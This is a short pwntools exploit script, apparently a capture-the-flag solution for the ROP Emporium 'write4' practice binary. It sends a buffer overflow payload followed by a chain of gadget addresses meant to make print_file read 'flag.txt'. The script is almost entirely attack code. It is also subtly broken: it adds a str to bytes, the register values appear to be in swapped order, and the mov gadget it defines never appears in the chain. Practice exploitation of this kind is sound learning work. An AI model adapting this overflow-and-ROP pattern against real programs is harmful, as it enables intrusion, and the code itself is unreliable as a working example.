from pwn import * 

pr = process("./write4")

print_file = p64(0x00400620)
cat = "flag.txt"
dynamic = p64(0x600e00+0x00000e00)
mov_a14_15 = p64(0x0000000000400628)

pop_14_15 = p64(0x0000000000400690)
pop_rdi = p64(0x0000000000400693)
ret = p64(0x00000000004004e6)

payload = b"A"*40 +ret+ pop_14_15 +  cat +dynamic + pop_rdi + dynamic + print_file

pr.sendline(payload)
print(pr.recvall().decode())
